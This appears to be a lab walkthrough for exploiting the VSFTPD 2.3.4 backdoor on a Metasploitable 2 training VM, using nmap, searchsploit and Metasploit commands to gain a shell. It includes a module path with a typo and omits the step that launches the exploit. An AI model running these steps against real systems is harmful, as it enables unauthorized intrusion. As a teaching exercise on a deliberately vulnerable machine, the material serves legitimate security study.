VSFTPD is a File Tranfer Protocol (FTP) server for systems based on UNIX. VSFTP is the default FTP server in the Ubuntu, Fedore, CentOS, NimbleX, Slackware, and RHEL Linux distributions. In this scenario, VSFTPD v2.3.4 might contain a backdoor that can be exploited. The developers of this version of VSFTPD has since removed the package. However, many people have downloaded this specific version and is not aware of the backdoor.

In this scenario, we will be exploiting this backdoor on the Metasploitable 2 virtual machine by using a exploit in Metasploit known as vsftpd_234_backdoor.

Run the nmap command in the terminal

command: nmap -p- -sV "target machine's ip address"

Once the command has finished running, nmap will provide a report on all the ports that are open on the target machine. This allows the attacker to easily exploit a number of vulnerabilities without searching manually for the vulnerabilities.

Run the searchsploit command in the terminal

command: searchsploit vsftpd

Searchsploit allows an user to search through the local repository of the machine to check whether the exploit is installed on the machine locally.

Run "msfconsole" and thereafer "use" in the terminal

command: msfconsole
command: use exploit/unix/ftp/vsftp_234_backdoor

Run the set rhost command in the terminal

command: set rhost "ip address of target machine obtained in Step 1"

This command points the exploit to the target machine that will be exploited.

Success. We have exploited the flaw

command: ifconfig (indicates that we have ownership of the target machine's command prompt)
